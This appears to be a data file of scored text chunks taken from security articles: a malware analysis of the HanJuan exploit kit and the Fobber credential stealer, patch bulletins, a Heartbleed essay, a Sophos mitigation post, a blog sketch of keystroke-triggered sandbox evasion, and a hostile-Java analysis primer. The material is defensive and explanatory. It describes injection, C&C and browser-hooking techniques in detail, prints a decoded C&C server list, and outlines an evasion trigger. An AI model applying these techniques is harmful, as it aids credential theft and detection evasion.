Subsequent redirections:,0.008312910646940175
"The next three sessions were somewhat different from the rest and an actual connection between them could not be established right away. A deeper look revealed that the intended URL was loaded via Cross Origin Resource Sharing (CORS).
Cross-origin resource sharing (CORS) is a mechanism that allows restricted resources (e.g. fonts, JavaScript, etc.) on a web page to be requested from another domain outside the domain from which the resource originated. Wikipedia",0.011243137959570215
"Content is retrieved from the adk2.com ad network via the Access-Control-Allow-Origin request.
This takes us to the actual malvertising brought by youradexchange.com:",0.012161207535659524
The inserted URL may look benign and it is indeed a genuine Joomla website but it has one caveat: It has been compromised and is used as the gate to the exploit kit.,0.013936001447895308
"Exploit kit
The exploit kit pushed here looked different than what we are used to seeing (Angler EK, Fiesta EK, Magnitude EK, etc.). After some analysis and comparisons, we believe it is the HanJuan EK.
We have talked about HanJuan EK only very few times before because little is known about it. What we once described as the Unknown exploit kit, was in fact HanJuan and it has been extremely stealthy and evasive ever since.
And yet, here we found HanJuan EK hosted on a compromised website and with an easy way to trigger it on demand.",0.012455321913706352
The landing page is divided into two main parts:,0.007873169561749438
"Code to launch a Flash exploit
Code to launch an Internet Explorer exploit",0.008008227708601212
"The filename for the Flash exploit is randomly generated each time using close patterns to the original HanJuan we’ve observed before.
However a new GET request session containing the Flash version used is inserted right after the exploit is delivered.
Finally, the payload is delivered via another randomly generated URL and filename with a .dat extension. Contrary to previous versions of HanJuan where the payload was fileless, this one drops an actual binary to disk.
Fiddler traffic:",0.010805894591276455
Landing page (raw):,0.009108386644345323
Flash exploit: (up to 17.0.0.134 -> CVE-2015-0359),0.010376953989512439
"The exploit performs a memory stack pivoting attack using the VirtualAllocEx API.
Internet Explorer exploit (CVE-2014-1776):",0.005696116605719004
"In this case we also have a memory stack pivoting exploit but in the undocumented NtProtectVirtualMemory API.
Malwarebytes Anti-Exploit users were already protected against both these exploits:",0.005991301440460672
"Malware payload
The malware payload delivered has been identified by our research team as Trojan.Agent.Fobber. This name was derived from a folder called “Fobber” that’s used to store the malware along with its associated files.",0.010841464691549008
"Unlike a normal Windows program, Fobber makes it a habit to “hop” between different programs. The flow of execution for Fobber looks something like that seen below:",0.015553978473395458
"From what we have observed in our research, the purpose of the Fobber malware appears to be stealing user credentials for various accounts. While we have not confirmed any ties between Fobber and other known malware as of yet, we suspect it may be related to other information-stealing Trojans, like Carberp or Tinba.
Fobber.exe
This is the original file dropped by the exploit kit in the user’s temporary directory. The file itself has a random name, but will be referred to as fobber.exe in this article.
Fobber.exe is mildly obfuscated program. The samples we have observed always attempt to open random registry keys and then the malware performs a long sequence of jumps in an effort to create something like a “rabbit hole” for analysts to follow, slowing down analysis.",0.010986917214982572
"At the end of the jumps, the program decodes additional shellcode and creates a suspended instance of verclsid.exe. Verclsid.exe is a legitimate Microsoft program that is part of Windows, used to verify a Class ID. The shellcode is in injected into verclsid.exe and fobber.exe resumes execution of verclsid.exe. Below is an API trace of this behavior.",0.01192027449124533
"At this point fobber.exe terminates and the malware execution continues in verclsid.exe.
Verclsid.exe (Fobber shellcode)
The main purpose of the Fobber shellcode inside of this process is to retrieve the process ID (PID) of Windows Explorer (explorer.exe) and inject a thread into the process. Injecting code into Windows Explorer is a very common stealth technique that’s been used in malware for many years.
It is also worth nothing that, starting with the Fobber shellcode inside of the verclsid process, the malware begins using an interesting unpacking technique designed to slow analysis that is exhibited throughout the remainder of the Fobber malware’s operation.
Before a function can be executed, its code is first decrypted, as seen in the image below (notice the junk instructions following “decode_more”).",0.014528060672146736
"And then after the call, the instructions become clear.",0.013331618408157775
"Eventually, when the function wants to return, it calls a special procedure that uses a ROP gadget.",0.015190828717706495
"In side the call seen above (“return_caller”), the return pointer is overwritten to point to the return pointer of the parent function (in this case, sub_41B21A). In addition, all the bytes of the function that was just executed have been re-encrypted, as seen below.",0.015130652298566583
"Such techniques can make the Fobber malware more difficult to analyze than traditional malware that unpack the entire binary image. Similar functionality is also seen in many commercial protectors, like Themida.
In order to locate the PID of Explorer, the malware searches for a known window name of “Shell_TrayWnd” that’s used by the Explorer process.",0.012314265956805848
"The shellcode uses the undocumented function RtlAdjustPrivilege to grant vercslid.exe the SE_DEBUG_PRIVILEGE. This will allow verclsid.exe to inject code into Windows Explorer without any issues. Following this function, more shellcode is decrypted in memory and a remote thread is created inside Explorer.",0.008488119209548617
"Following successful injection, verclsid.exe terminates and the malware continues inside of Windows Explorer
Explorer.exe (Fobber shellcode)
At this point the Fobber malware begins its main operations, to include establishing persistence on the victim computer, contacting the C&C server, and many more actions.
Persistence
Fobber keeps a foothold on the victim computer by copying itself (fobber.exe) into an AppData folder called “Fobber” using the name nemre.exe. On a typical computer, this path might look like:
C:\Users\<username>\AppData\Roaming\nemre.exe
The binary is launched when a user logs in using a traditional “Run” key method in the registry.",0.015134193985552269
"Whenever nemre.exe is launched at login, it will proceed using the same flow of execution, injecting into verclsid.exe and then inside Windows Explorer.
Modifying Internet Settings
Fobber also makes a few various changes to the victim’s Internet settings to ensure everything runs smoothly
HKCU\Software\Microsoft\Internet Explorer\Main
Value: TabProcGrowth - Set to 1 (on)
HKCU\Software\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3
Value: 1609 - Set to 0 (off)
In addition, if the Firefox browser is installed, Fobber will attempt to modify browser settings by disabling the SPDY protocol, although it doesn’t seem like this function was implemented correctly.
Contacting the command server
Communication with C&C is encrypted using what is believed to be a custom algorithm. Additionally, the content sent by the server is signed by it’s RSA1 key (to prevent botnet hijacking), while the Fobber code has the public key embedded within, verifying the signature before processing the content.",0.011349585010848484
"The communication is initialized by the infected client’s POST request; the data sent from the client is always prompted by it’s ID that consists of the hard disk volume serial number and the OS install date. Following this content is content specific to the request made to the server.
Example (initial request: 18 bytes long)
raw:
79 3B C3 40 9B AC 80 55 00 05 00 00 00 50 4C 00 00 FF |y;Ă@›¬€U....PL..˙|",0.00984224807237688
"after encoding:
7A 32 53 3C 6E B6 BC 3F 92 27 5C 3F F7 0C 21 0F 0B C8 |z2S.n..?.'\?..!...|",0.013509321650748363
"During the process of communication, the command server may sent some notable payloads, i.e:",0.016184357024179863
"Updated explorer shellcode
List of new command servers",0.00792600085922146
The payloads are saved in the malware’s directory – in encrypted form – and decrypted by Fobber as needed:,0.0071456005910327525
"Thus far we have observed three particular files the Fobber malware looks for, which are: ktx.sdd, lerp.wpo, and mlc.dfw. As of the time of this writing, the we have not ascertained what mlc.dfw is used for, although we believe it will still be stored in an encrypted format like other Fobber files.
Updating Command Servers
One file Fobber downloads periodically from the command server is called “lerp.wpo”. This file contains updated command server information to help the malware stay operational provided any command servers are taken down. The format for lerp.wpo is:
[Domain][Post Directory]
Below is an example of a decrypted lerp.wpo file:
003F810C | 35 2E 31 39 36 2E 31 38 39 2E 33 34 00 2F 48 63 | 5.196.189.34./Hc
003F811C | 6D 44 75 6F 00 77 77 77 2E 32 73 6D 69 6C 65 2E | mDuo.www.2smile.
003F812C | 65 75 00 2F 38 37 73 31 35 67 6B 2F 00 00 00 00 | eu./87s15gk/....",0.011938907229300577
"When the list of new command servers arrives, Fobber switches to the new server:",0.012749191724770292
"Browser injection
Fobber also keeps a close eye on processes that are running on the victim’s computer. In particular, Fobber checks for Google Chrome, Internet Explorer and Mozilla Firefox web browsers. Unlike traditional process enumeration used by malware, however, Fobber first takes each process name that is running and creates a checksum-like value to compare against hard-coded process checksums. By doing this, Fobber does not have to include the name of the actual process it is searching for, only the checksum, which can further inhibit analysis. For example, the checksum for Internet Explorer is 0xFC03162D.",0.013286254453790391
"Once Fobber has found a browser running, it will inject code into it using the same routine following the Windows Explorer injection.
Updating the malware
Over time, Fobber can update itself by contacting the command server and downloading an additional file called “ktx.sdd”. This file will be downloaded into the Fobber directory along with nemre.exe and loaded into memory if it exists.
By doing this, the Fobber malware can “refresh” itself, further enabling it to maintain a foothold in the victim system, and also looking for new or different information to steal.
Chrome, Internet Explorer, or Firefox (Fobber shellcode)
Following successful browser injection, Fobber looks for the presence of library used by IBM Security Trusteer Rapport and tries to unload it from memory. Rapport offers protection of browser sessions, which will likely interfere with the malware’s operation.",0.011912372482656863
"Following this check, Fobber checks to see what process it’s in and hooks certain functions accordingly.",0.011977198202351658
"Using the Internet Explorer browser, common functions from wininet.dll are hooked: InternetCloseHandle and HttpSendRequest.",0.014121587897728438
"When a request is made where a user has to enter credentials for a website, Fobber checks to see if it’s something interesting. To do this, it compares the url in the request to list regular expression strings that are decoded in memory. Each item in the list is prefixed with either “P” or “!GP,” the meaning of which is not clear.",0.009370744080898996
"When Fobber finds a request matching an expression, it packages it by using the same custom algorithm, followed by sending it to the command server. Below is an example of a request to login to a Google account, where the username and password are intercepted before being encrypted and sent to Google servers for authentication (username and password filtered).",0.013181501711720722
"Once it has arrived at the command server, the package will be decrypted and likely parsed using a separate program to extract relevant information, like usernames and passwords.
Conclusion
Every encounter with HanJuan EK is interesting because it happens so rarely. As always the exploit kit only targets the pieces of software that have the highest return on investment (read: most deployed and with available vulnerabilities): Internet Explorer and the Flash Player.
The malvertising component was a little bit out of place for such a stealthy exploit kit. This is also true for the site hosting the kit, a genuine Joomla! website in the Netherlands. We have passed on the information about that server so that a forensic analysis and full investigation can be conducted.
The dropped binary, which we nicknamed Fobber, has the ability to steal valuable user credentials and is also fairly resistant to removal by receiving updates to both itself and command servers. While our research teams have not observed Fobber stealing any banking information, it certainly seems possible considering the flexibility offered by the malware’s update model. We will continue to provide any updates on Fobber in our blog as we see any improvements made in the malware.
Contributing analysts:
@joshcannell
@hasherezade
",0.009862669251398337
Microsoft patches 15 important vulnerabilities,0.008961424536899965
"This month, Microsoft issued 5 security bulletins covering 15 vulnerabilities in Excel and Windows. These updates are considered important rather than critical, as by the time of the patch there was no malicious code exploiting the vulnerabilities in the wild. Adobe also released a security bulletin patching 13 vulnerabilities in Acrobat Reader. Websense® Security Labs highly recommends applying the updates in order to avoid cyber criminals who may use these security holes for their malicious activities.",0.018027050978060233
"Arguably the most important bulletin is MS11-072, which targets five different vulnerabilities in Microsoft Office. An attacker could use any of these to execute arbitrary code on the computer with the same access rights as the user. This is a focus for any security researcher as hackers are constantly looking for newer ways to distribute their badware. Such issues are probably getting more and more headlines as Adobe's sandboxing system and regular security patches seem to be paying off, meaning an up-to-date system is much less prone to successful exploits by vulnerabilities in PDFs.",0.01075002893447441
"This does not mean, of course, that we will see no more vulnerabilities in Acrobat Reader. This Tuesday Adobe Issued a security bulletin too, fixing 13 vulnerability issues in their product. Each of the vulnerabilities could allow an attacker to execute a code on the host computer allowing them to take full control of it. This patch is rated as critical, therefore it is strongly recommended to apply it.",0.0098557944209412
"Also worth mentioning is that many companies have updated their DigiNotar certificates - Microsoft, Adobe, and even Mozilla Firefox issued the updates. Firefox even released an additional security patch targeting this issue. Please check that you have applied the latest updates so you are fully protected.",0.015382625982169551
Is your organization using the latest Firefox 6 or Internet Explorer 9? Which one did you find more secure? Give us your thoughts in the comments.,0.017597482818901167
Vulnerabilities patched by Microsoft on 13 September 2011:,0.006205445559260503
MS11-070 WINS Local Elevation of Privilege Vulnerability (CVE-2011-1984),0.013014742828140524
MS11-071 Windows Components Insecure Library Loading Vulnerability (CVE-2011-1991),0.014995643053242191
MS11-072 Excel Use after Free WriteAV Vulnerability (CVE-2011-1986),0.015843263511477912
MS11-072 Excel Out of Bounds Array Indexing Vulnerability (CVE-2011-1987),0.01368097087249065
MS11-072 Excel Heap Corruption Vulnerability (CVE-2011-1988),0.015033744532779947
MS11-072 Excel Conditional Expression Parsing Vulnerability (CVE-2011-1989),0.015523110560950792
MS11-072 Excel Out of Bounds Array Indexing Vulnerability (CVE-2011-1990),0.01380435812319436
MS11-073 Office Component Insecure Library Loading Vulnerability (CVE-2011-1980),0.015626374717261804
MS11-073 Office Uninitialized Object Pointer Vulnerability (CVE-2011-1982),0.015267568868216008
MS11-074 XSS in SharePoint Calendar Vulnerability (CVE-2011-0653),0.012140486431178488
MS11-074 HTML Sanitization Vulnerability (CVE-2011-1252),0.012996340964954056
MS11-074 Editform Script Injection Vulnerability (CVE-2011-1890),0.011242661872662651
MS11-074 Contact Details Reflected XSS Vulnerability (CVE-2011-1891),0.011875795972792647
MS11-074 SharePoint Remote File Disclosure Vulnerability (CVE-2011-1892),0.012691796804192745
MS11-074 SharePoint XSS Vulnerability (CVE-2011-1893),0.0119879402269778
Vulnerabilities patched by Adobe on 13 September 2011:,0.006508282617931127
Local privilege-escalation vulnerability (Adobe Reader X (10.x) on Windows only) (CVE-2011-1353).,0.017145993622901257
Security bypass vulnerability that could lead to code execution (CVE-2011-2431).,0.009777482199820664
Buffer overflow vulnerability in the U3D TIFF Resource that could lead to code execution (CVE-2011-2432).,0.010169435713992092
Heap overflow vulnerability that could lead to code execution (CVE-2011-2433).,0.010612573637216238
Heap overflow vulnerability that could lead to code execution (CVE-2011-2434).,0.010646730558065642
Buffer overflow vulnerability that could lead to code execution (CVE-2011-2435).,0.01031578556458701
Heap overflow vulnerability in the Adobe image parsing library that could lead to code execution (CVE-2011-2436).,0.010489435398880365
Heap overflow vulnerability that could lead to code execution (CVE-2011-2437).,0.010471313112526137
Stack overflow vulnerabilities in the Adobe image parsing library that could lead to code execution (CVE-2011-2438).,0.009639691908711945
Memory leakage condition vulnerability that could lead to code execution (CVE-2011-2439).,0.009679271414085422
Use-after-free vulnerability that could lead to code execution (CVE-2011-2440).,0.010641158150007879
Stack overflow vulnerabilities in the CoolType.dll library that could lead to code execution (CVE-2011-2441).,0.00838958729522199
Logic error vulnerability that could lead to code execution (CVE-2011-2442).,0.010150056111696948
"Websense Security Labs and our ThreatSeeker Network are constantly monitoring for these threats occurring in the wild.
",0.016223356806108313
"Over a year has now passed since we were first alerted to a flaw in the OpenSSL cryptography library, widely used in the implementation of Transport Layer Security (TLS) protocol. The bug CVE-2014-0160, was quickly dubbed “Heartbleed” (http://heartbleed.com/) after a missing bounds check in the TLS heartbeat extension. Despite the passing of time and the high profile nature of the flaw, IoT crawler Shodan has recently discovered the vulnerability still exists on over 200,000 internet connected devices.
Shodan (http://www.shodanhq.com/) launched in 2009, is a search tool that seeks out internet-of-things (IoT) and other internet connected devices collecting the information returned by these devices to build up a picture of what services are being offered. The data can then displayed in a variety ways including by geo-region breakdown. This is great tool for IT and security teams and unfortunately also for the bad guys.
Many people will deem 200,000 vulnerable devices on the internet as unacceptable, and in many ways it is. At the same time I think it is important for us all to understand why this happens and why there is currently no easy fix. I believe we will see vulnerabilities like Heartbleed in the wild for many years to come. Whereas I do believe there is a certain level of ignorance to the threat, I also believe there are many other factors.
There are users who aware their devices are vulnerable, not realizing their device uses the buggy version of OpenSSL, or even uses SSL for communication. There will be others that haven’t heard of Heartbleed and many not understanding the tech details, the fix, or the ramifications. Sometimes putting two and two together is little more difficult that we’d like to think. Hey, we are asking users to understand and fix their devices, when at present they still haven’t changed the device’s default admin password – even worst, they’ve not realized their device is even connected to the internet.
Ignorance and even arrogance with regards to the lack of patching has been observed. Not patching a device when possible, believing it is unlikely to be exploited is simply not acceptable. We need to move away from setup and configure once, then leave alone. Users need to research, revisit and understand the devices on the network and especially those connected to the internet.
Search engines like Shodan mean that susceptible devices are less likely to go under the radar – it also highlights the appetite the business and personal sector have for security. Once the configuring and setup of these devices required a certain skill level. That’s all changed now, especially with WPS and other technologies, many devices are completely ‘plug and play’. The complexities of such systems are hidden from the user – even if patches are available for said devices, I very much doubt many users would know how to install them.
There are also many manufacturers that focus on the delivering of ‘cheap’ affordable technology, OEM and unbranded to an untrained eye in many cases. These cheaper offerings normally come at a price – limited aftercare. Put simply you’ll be lucky to ever see manufactures release new firmware and software updates after purchasing and that’s if the vendor still exists.
The mobile phone industry has used a similar business model for years, after a while updates stop, if they even started – meaning customers will need to go out and purchase the a new handset/hardware to have the latest and most secure software. What we are left with is millions of vulnerable internet connected devices. Most devices, especially legacy devices, the ones most likely to be at risk have no OTA (over the air) update capabilities, many do not even include a manual update feature – many are not even capable of running the newer firmware and software.
There’s a lot of bad news, but it doesn’t mean a certain level of protection cannot be offered – something the Shodan results are unable to factor in. Internet connected devices need continuous monitoring to detect common attacks, the use of automated vulnerability scanning solutions, the use of tools like Shodan. There are many possible ways to mitigate risk, like the separating of networks. Heartbleed has been a big wake up call, the number of probable vulnerable devices, the extra media attention along with the slick branding propelled this security risk from the geeks and IT and security professionals all the way to the boardroom. It’s important not to be fooled in to thinking this is only an IoT issue, a proportion of the devices highlighted belong to the more traditional internet infrastructure hardware group. That said, the mass adoption of IoT will only make future vulnerabilities more difficult to correct.
I don’t see these current findings as a ‘we haven’t patched Heartbleed’ issue, it’s another example of what happens without regulation and standardization, without user education and best practices, coupled with the ‘security as an afterthought’ mentality.
",0.0217511237783371
PRODUCTS & SERVICES,0.010734820384793453
Blocking attacks against Windows “CTF” vulnerabilities,0.0072893969714623585
"Written by
Mark Loman",0.008668015260164808
"August 22, 2019",0.008798158110266296
Products & Services CVE-2019-1162 Microsoft Windows,0.008882584271869387
"Operating systems and run-time environments typically provide some form of isolation between applications. For example, Windows runs each application in a separate process. This isolation stops code running in one application from adversely affecting other, unrelated applications.
This means a non-administrative user mode process can’t access or tamper with kernel code and data, and an unauthorized user mode process can’t dig into the code and data of another process.
But it turns out that Windows process isolation is imperfect, thanks to an undocumented and buggy component known only as “CTF”, part of the Windows Text Services Framework (TSF), that is present in all versions right back to Windows XP.
The dated code and insecure design of this subsystem allows a non-administrative, unauthorized attacker to hijack any Windows process – including applications running in a sandbox like AppContainer – and to gain full admin rights.
This design flaw in CTF was discovered and exploited by Google Project Zero researcher Tavis Ormandy, who wrote an in-depth blog article about his findings.
Designated CVE-2019-1162, Ormandy’s attack is what’s known as an Elevation of Privilege (EoP) vulnerability.
That means it doesn’t allow attackers to break into computers in the first place – to exploit this weakness, an attacker must already have got in, perhaps by using credentials stolen from another computer, by exploiting a remote code execution vulnerability, or by tricking the user into opening a booby-trapped document or running malicious software (malware).
Nevertheless – even though Sophos Intercept X already stops attackers getting this initial foothold, and even though the CVE-2019-1162 bug has already been patched by Microsoft – we expect adversaries to try to find additional weakness in CTF, taking advantage of the attack surface that stems from CTF’s old and insecure design.
So, the Sophos Threat Mitigation team has developed a system-level exploit mitigation that prevents abuse of the CTF subsystem.
Dubbed CTF Guard, this new component intercepts and blocks applications that attempt to exploit CTF.
For example, Tavis Ormandy’s cfttool.exe, described as an “interactive CTF exploration tool” that lets researchers probe and try to find holes in CTF, will be intercepted and terminated when it attempts to connect and communicate with the CTF subsystem:",0.012627589348518486
"CFT Guard is already available in Sophos HitmanPro.Alert, and is coming soon to Sophos Intercept X.",0.015039719902193216
Share on Facebook,0.00998712431791049
Share on Twitter,0.009909977340160525
Share on LinkedIn,0.009855679767380665
"1
",0.011966970221767848
"State machine on top of another state machine i.e. konami code as a sandbox evasion
October 21, 2018 in Anti-*, Batch Analysis, Sandboxing",0.010275497520923826
"The recently discovered bug in libssh (CVE-2018-10933) made me think of a state machine mechanism a bit. Not the particular one causing that specific bug, but the one that is embedded and used by all windows. Many programmers know it as a Windows Procedure – a callback routine executed anytime there is a window message waiting in a queue.
The windows message loop calling the windows procedure is a foundation of the Windows UI; given its omnipresence it has been attacked many times before and many techniques are known e.g. shatter attacks, malicious automation (f.ex. closing dialogs from security products, clickjacking), as well as privilege escalations, and delayed code execution. Some older malware (e.g. Upatre) actively abused it and executed its main code inside the windows routine; more info on the existing anti-emulation techniques within this space can be found in this preso (pdf/slideshare site warning).
So, now that we know the standard windows procedure has been used by malware in the past you may be wondering what this post is about. Well, it’s about another state machine. One that can be built on top of an existing windows message loop. We can probably call it a Konami code, since the idea I am describing is pretty much borrowed from this famous game trick.
Konami code implementation can be a simple state machine that progresses when specific keys are entered by the user (e.g. keys collected in response to WM_CHAR, WM_UNICHAR , WM_KEYDOWN, etc. messages). A program would wait for a keyword to be entered by a user. Notably, for it to work, the keyword should be a relatively popular word to ensure that the state machine is actually reaching its final stage. Things like ‘hello’, ‘thanks’, ‘lol’, or even shortcuts for emojis should do the trick. Even a combo of 10 pastes (10x CTRL+V) could be a good trigger as well. Anyone writing emails, editing report, or posting memes on Slack would trigger these in no time while the sandbox or even reverse engineer will be stuck until they reverse the actual routine to understand what the trigger is. And if none of these work, there is always a way to introduce a timeout after which the main payload code will still execute.
While the original konami code was keyboard-centric, nothing stops a coder from implementing a mouse-centric, or a hybrid approach. For instance, one could wait after N mouse moves to the left top corner are registered before the keyboard konami input code is enabled.
If you are a windows programmer you probably recognize the caveat of the idea described above – in order to intercept the windows messages the window needs to be active – and if it is not, it has to attach itself to capture certain messages system-wide e.g. using SetCapture API for mouse. This is tricky and obviously the best possible way to implement it is by using well-known keylogger techniques…
How to deal with it on a sandbox/reversers’ side? I doubt there is a generic way to detect such trigger in an automated fashion, but luckily malware families don’t change that fast; once such stealth-trigger-happy malware family is discovered and analyzed there is always a way to extract the trigger info in a generic way – either statically, or dynamically. The script to trigger the code can be then deployed for this particular family. Also, just a presence of active keylogging functions is a good indirect indicator as well. And who knows, perhaps in some cases it’s enough and we don’t even need to bother to know the konami code… Oh well, just one of these ideas.",0.017226982705619176
Comments Off on State machine on top of another state machine i.e. konami code as a sandbox evasion,0.008794464061800844
"Comments are closed.
",0.01623942207169282
"Introduction to hostile Java analysis
2011-02-01",0.009937712742627891
"Ed Jones
Independent researcher
,
USA
Editor:
Helen",0.009971851585160674
"Martin
Abstract
Fraudsters have abused Java to obfuscate attacks, hinder research and response, and maximize profits. Security experts need an understanding of common Java-based attacks and their implications in order to respond to emerging threats in the wild. Ed Jones presents an introduction to hostile Java analysis.
Copyright © 2011 Virus Bulletin",0.01604735382469724
"Java is a powerful platform-independent programming language that is widely used within web applications and mobile media. Fraudsters have abused Java to obfuscate attacks, hinder research and response, and maximize profits. Security experts must have an understanding of common Java-based attacks and their implications in order to best respond to emerging threats in the wild.",0.014647720432314881
"Introduction to Java
The Java programming language was developed by Sun Microsystems and first released in 1995. Its strength is that it is platform independent. As a result, a Java program can be deployed to many operating systems as a standalone solution. For example, a Java program may be authored and placed within a web medium, then be able to be downloaded and run on Windows, Macintosh and Unix machines.
Source files normally have the extension ‘.java’, while compiled Java files use the extension ‘.jar’. JAR files (Java ARchives) are an aggregation of class files and metadata such as images and text used within a Java application. JAR files can be unpacked using tools like WinZip, as they contain a PK header. Security experts analysing hostile JAR files must first unpack the sample and then look to decompile the class files found within the archive. Figure 1 shows the header and class string references found in a JAR file for a hostile exploitation component used within the Eleonore exploit kit.
Figure 1. Hostile JAR file has PK header and strings of interest.
Notice that the meta-info and manifest data exist within the strings of this file. This is also a visual cue for identifying Java content, as JAR files always include both class files and a manifest with metadata.
Java source code is compiled to create what is known as a class file. Class files contain executable content for Java. Class files may also contain multiple files within them, known as inner classes. Security experts researching hostile Java applets (small web applications) look to capture, decompile and analyse code related to all class files found within a hostile JAR file.",0.021050540364809467
"Jnana Javabot
Jnana Javabot is a prime example of the advancing nature of malicious Java usage. The code was first reported publicly by Symantec in October 2010 [1]. Jnana Javabot is a new botnet that uses Java as the command and control (C&C) infrastructure, making it platform independent. It already has modular payloads for Windows and Macintosh and could easily be extended to Droid and other platforms of interest.
Jnana Javabot also leverages tactics seen with other former major threats, which clearly indicates that the developers are current and progressive and/or possibly affiliated in some way with these former threats. Like Zlob, Jnana Javabot contains a fake codec trick to spread via Facebook. It also utilizes a complicated domain generation algorithm similar to that seen in Conficker, and unique P2P features reminiscent of the infamous Storm worm.",0.015199709119277816
"JRE attacks
While Jnana Javabot sets the stage for botnets of the future – including mobile platforms – current threats related to Java primarily include exploitation of Java itself and hostile Java applets.
The Java Runtime Environment (JRE) is one of the most popular targets for criminals to exploit. It has widespread popularity in the underground, and is considered one of the best new vectors of opportunity on machines that might not otherwise be compromised. Multiple new exploits for Java enable criminals to compromise computers of interest that are not patched.
Enterprise networks regularly use older, unpatched versions of Java because of business requirements to run specific legacy versions for compatibility with proprietary solutions. To make matters worse, many of these legacy-based Java solutions run on critical servers with important assets at risk. Such exploitation leads to a variety of possible payloads for the system that is compromised.
Exploitation of JRE is frequently performed through malicious JAR files containing hostile Java applets designed to exploit a vulnerability on the remote computer.",0.014278489478963152
"Hostile Java applets
Java applets are small, web-based applications. Instead of having code that is readily visible, such as in JavaScript-based attacks, the code is compiled within a Java file.
An investigation into hostile Java artefacts commonly begins with the capture of a questionable JAR file. Once the JAR file has been properly analysed additional research and response is initiated to better understand the JRE exploit vector or behaviour/intent of the hostile Java attack.
A wealth of applications are available to work with JAR files. One such tool is the Mobilefish Java class decompiler [2]. This free, web-based tool provides an amazing amount of analysis for a submitted file. Simply browse for the file to analyse, complete a CAPTCHA input entry, and click on ‘decompile’. A wealth of related Java information is also available on the Mobilefish site [3], [4].
Some of the easiest WYSIWYG Windows-based GUI tools include Cavajdemo, DJ Java Decompiler (djdec39) and Java Decompiler (JD-GUI). Unlike command-line tools, these offer solid decompiling capabilities along with an organization of functions and/or colour-coding of decompiled scripts.
Figure 2. Cavaj freeware default view.
Figure 3. DJ Java Decompiler default source code view.
Figure 4. Java Decompiler default view.
Cavajdemo requires a set-up program to run and then for the user to locate the installed application in the Program Files directory to run it, but is worth the price of admission: it’s free. DJ Java Decompiler also requires a set-up and is not freeware, but it does include a nice option to switch between source code and byte code views. Java Decompiler (JD-GUI) is the easiest to use, with drag-and-drop functionality and no set-up required, and it is free. It also contains a ‘Save Sources’ menu option for exporting all decompiled scripts.
After loading a class file of interest into Java Decompiler it is easy for the analyst to identify the primary functions of the script indented by the tool automatically (‘Main()’ and ‘init()’ in this example). The analyst may then review the decompiled source code looking for URLs (not often seen in 2010 and later), CLSID (Windows Class Identifier) values possibly related to exploitation vectors, and similar strings of interest. In this example, the strings shown in Figure 5 are found near the bottom of the code.
Figure 5. Strings of interest in questionable JAR and class file.
The text ‘soundbank’ is linked to URL activity. Within the context of malicious code attacks this is a string of significant interest. The first result in an Internet search for ‘soundbank java exploit’ identifies a JRE vulnerability for CVE-2009-3864. When this is looked up on the Mitre website 5 it is clear that the file under analysis probably exploits a JRE vulnerability impacting JDK/JRE 5.0 before update 22 and JDK/JRE before update 17 when a non-English version is used. This information can be cross-checked with other research and response data to better qualify this possible threat vector. Additionally, the exact versions of the software on the possibly compromised machine may be compared to what is known to be vulnerable for this vector of attack.
If the machine is found to be running the software versions that are known to be vulnerable to this exploit vector, additional work may be performed to further qualify the threat, including anti-virus scanning, behavioural tests, and reverse engineering.",0.019869160248023987
"Case study example
In 2008, a hostile iFRAME at hxxp://www.psu.com/poll.php led to a CGI redirection at hxxp://asvsutra.info/ in.cgi?7. This then led to hxxp://liveinternets.com/all/update.php containing two layers of obfuscation leading to nine exploit pages, eight of which were functional at the time of the incident. One of the exploit vectors was an Exploit.Byteverify (MS03-011) attempt via java.php. An analysis of hostile artefacts found on a compromised machine included several class files of interest:
Baaaaa.class
BaaaaBaa.class
Dex.class
Dix.class
Dux.class
Dvnny.class
VaaaaaaaBaa.class
Anti-virus scans of these files led to detection names for ClassLoader (ByteVerify). An analysis of the decompiled code also reveals the same functionality (Figure 6).
Figure 6. Analysis of hostile class files.
A search for the MD5 values of each class file also resulted in a VX Heavens match for a ClassLoader trojan (ByteVerify exploitation), confirming this component of the incident involving Java. This information arms security personnel with at least one component of exposure during the attack. Security teams are then able to identify the method of exploitation to patch and/or harden against it in addition to following up on exploit mitigation and finding other machines that may be vulnerable to the same attack.",0.009719116168690256
"Concluding remarks
Early Java-based threats were simple tricks to move hostile URLs out of JavaScript and HTML-type environments into compiled Java files. Java-based attacks have greatly matured since the early days of exploitation, now frequently including many layers of redirection and obfuscation and the use of many artefacts to hinder research and response. Criminals are also leveraging Java to manage their own platform-independent attacks as well as exploit vulnerable versions of JRE.
Java-based threats have never been more real and likely than they are today, making it essential for all incident response teams to have a good understanding of this threat vector and knowledge of how to perform initial analysis of such attacks. More importantly, all security staff should be prioritizing Java-based security measures, given the widespread exploit vectors available for various versions of JRE and the popularity of this vector amongst criminals exploiting the drive-by vector.",0.0165858371168357
"Bibliography
[1] Trojan.Jnanabot: Trojan Affecting Multiple Platform. http://www.symantec.com/connect/blogs/trojanjnanabot-trojanaffecting-multiple-platforms.
[2] Mobilefish Online Java class decompiler. http://www.mobilefish.com/services/java_decompiler/java_decompiler.php.
[3] The Java Community Process Program. JSRs: Java Specification Requests. http://jcp.org/en/jsr/detail?id=20.
[4] Mobilefish Java Quick Guide. http://www.mobilefish.com/tutorials/java/java_quickguide_classfile.html.
[5] CVE-2009-3864. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3864.
",0.011753601946192793
"Watch SophosLabs experts present their research on Hacking Team, PDF malware and APTs",0.010577899739825813
"Written by
John Zorabedian",0.00826774006182307
"February 11, 2016",0.009163416606356889
Products & Services Threat Research APT Attila Marosi Gabor Szappanos Hacking Team Hacktivity Jason Zhang,0.009600260764558777
"You might not have had a chance to make it to Budapest, Hungary for the Hacktivity 2015 conference, to see live presentations by some of our crack team of SophosLabs researchers.
Well, now we have videos from the event, so you can see three of our researchers give their talks, almost as if you were there! Their presentations cover some interesting topics.
Attila Marosi gives us an introduction to the Hacking Team malware exposed last year by a breach of the Italian hacking-for-hire company. Jason Zhang investigates new techniques used in recent PDF malware campaigns. And Gábor Szappanos analyzes and compares different malware authors on the advanced persistent threats (APT) scene.
Attila Marosi – Hacking Team Malware
The huge amount of data stolen from Hacking Team let us inside the work of the company that develops malware and exploits for its clients on the country level.
Attila’s presentation is broken into three parts. The first part is a quick introduction to Hacking Team’s exploit delivery network, how the malware was delivered to the targets, and how the infected devices were controlled through the proxy chain.
The second part is a detailed analysis of the exploits Hacking Team used to infect Android devices, including the installation (infection) process, and how they were used to elevate privileges on those devices.
The third part examines a collection of interesting techniques Hacking Team used to keep the malware as silent and undetectable as possible.",0.015218999583153647
